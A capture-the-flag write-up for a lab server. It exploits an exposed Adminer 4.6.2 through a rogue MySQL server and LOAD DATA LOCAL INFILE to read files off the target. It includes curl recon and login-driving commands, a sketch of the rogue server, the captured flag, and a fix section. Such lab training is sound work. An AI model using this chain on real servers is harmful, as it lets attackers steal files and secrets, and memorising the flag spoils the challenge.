#### Challenge:

Hi Senior Researcher,

a group of researchers is preparing a new server for their upcoming project. It is not in production yet, so following the usual convention, the machine has been given an experimental hostname (such as <code>x-&lt;service&gt;&lt;year&gt;-&lt;index_in_year&gt;</code>).

Everything seems routine — until the network monitoring team notices something unusual: the server is making suspicious outbound TCP connections to port 3306. Its admins are attending an IEEE event and cannot be disturbed, so it is up to you to find out what is going on.

Stay curious!

The server sits on <code>x-www26-2.nren.tcc</code>

---

#### Solution:

The "suspicious outbound TCP to **3306**" is the whole hint: `x-www26-2.nren.tcc` serves a static
"Coming soon" page over Apache, but it also exposes **Adminer 4.6.2** at `/adminer.php`. Adminer is a
MySQL *client* you control — point it at any host and it dials out to 3306. That makes it an SSRF into
the MySQL protocol, and Adminer `<= 4.6.2` is vulnerable to the classic **rogue-MySQL
`LOAD DATA LOCAL INFILE`** arbitrary file read.

**1. Recon.** Find Adminer and the exposed `.env`:

```bash
curl -s http://x-www26-2.nren.tcc/adminer.php | grep -oiE 'Adminer [0-9.]+'   # Adminer 4.6.2
curl -s http://x-www26-2.nren.tcc/.env
```

The `.env` is a **decoy** — its `JWT_SECRET` base64-decodes to `{"this":"is not real","just":"decoy"}`,
and the `svc_dbadmin` / `db.nren.tcc` creds are rejected by the DB even from the app's own IP. Don't
chase it.

**2. Stand up a rogue MySQL server.** A ~50-line Python server (`mysrv.py`) that speaks just enough of
the protocol: send a greeting, accept the login, reply `OK`, then answer the client's first query with
a `0xFB` (LOCAL INFILE) packet naming the file to steal, and save whatever the client uploads:

```python
# core of the rogue server — on first query, request a local file
def infile(fname, seq): return pkt(b"\xfb" + fname.encode(), seq)
# ... greeting(0) -> recv(login) -> ok(2) -> recv(query) -> infile(TARGET,1) -> read uploaded bytes
```

Bind it on your VPN IP:3306 and set `TARGET` to the file you want.

**3. Drive Adminer to connect back.** Adminer's login needs the session-bound CSRF `token` from the
login form; the POST sets `adminer_sid` and 302-redirects, and the follow-up GET performs the actual
DB connection (and runs a query → triggers the file read):

```bash
B=http://x-www26-2.nren.tcc/adminer.php
TOKEN=$(curl -s -c cj $B | grep -oE "name='token' value='[^']*'" | sed "s/.*value='//;s/'//")
curl -s -b cj -c cj -D hdrs $B \
  --data-urlencode 'auth[driver]=server' --data-urlencode "auth[server]=<YOUR_VPN_IP>" \
  --data-urlencode 'auth[username]=root' --data-urlencode 'auth[password]=x' \
  --data-urlencode "token=$TOKEN" -o /dev/null
LOC=$(awk 'tolower($1)=="location:"{print $2}' hdrs | tr -d '\r')
curl -s -b cj "http://x-www26-2.nren.tcc$LOC" -o /dev/null   # fires the connect-back
```

**4. Read the flag.** The vhost config — itself readable through the file-read —
(`/etc/apache2/sites-enabled/adminer.conf`) spells it out: the flag lives in
`/var/www/public/backup/flag.txt`, which is blocked over HTTP by `.htaccess` (`Require all denied` →
`403`) but is plain on disk, so `LOAD DATA LOCAL INFILE` reads it straight out:

```bash
# set the rogue server's TARGET to /var/www/public/backup/flag.txt, re-trigger, then:
grep -oE 'FLAG\{[^}]*\}' loot_var_www_public_backup_flag.txt
# FLAG{u2G3-dsoj-nLGS-M9xh}
```

**Environment gotcha:** the target must be able to reach your rogue port — bind the listener on the
address family the target uses to call back (here it connected over **IPv4**), and make sure no local
firewall (`ufw`) or reverse-path filter (`rp_filter`) silently drops the inbound SYN.

**Fix:** upgrade Adminer and never expose it unauthenticated; disable MySQL client `local_infile`;
and don't rely on `.htaccess` to protect secrets that are readable on disk.

---

<details><summary>FLAG:</summary>

```
FLAG{u2G3-dsoj-nLGS-M9xh}
```

</details>
<br/>
